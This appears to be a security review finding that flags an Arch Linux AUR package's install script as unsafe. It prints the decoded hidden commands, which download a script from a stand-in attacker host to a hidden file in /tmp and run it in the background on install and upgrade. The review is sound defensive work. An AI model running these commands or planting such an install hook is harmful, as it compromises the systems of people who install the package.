## malware.install

Status: UNSAFE

Summary: Downloads and executes remote script via obfuscated commands

Details:

The installation script uses hex-encoded characters (e.g., `\x63` for 'c') to obfuscate common shell commands, a technique commonly used to evade detection. The obfuscated commands decode to: `cd /tmp`, `curl -fsSL http://evil.example.com/payload.sh -o .cache_update`, `chmod +x .cache_update`, and `./.cache_update &>/dev/null &`. This downloads and executes a script from an untrusted external domain `evil.example.com` during package installation — a classic supply-chain attack.

Executing downloaded code from a remote server outside the package's intended functionality is highly suspicious and dangerous. The use of obfuscation, combined with automatic execution of unsigned payloads from a non-upstream domain, strongly indicates malicious intent. This is not a standard or acceptable AUR packaging practice.

The script runs this payload in the background during both install and upgrade, increasing the attack window. There is no justification for such behavior in a legitimate Arch Linux package.
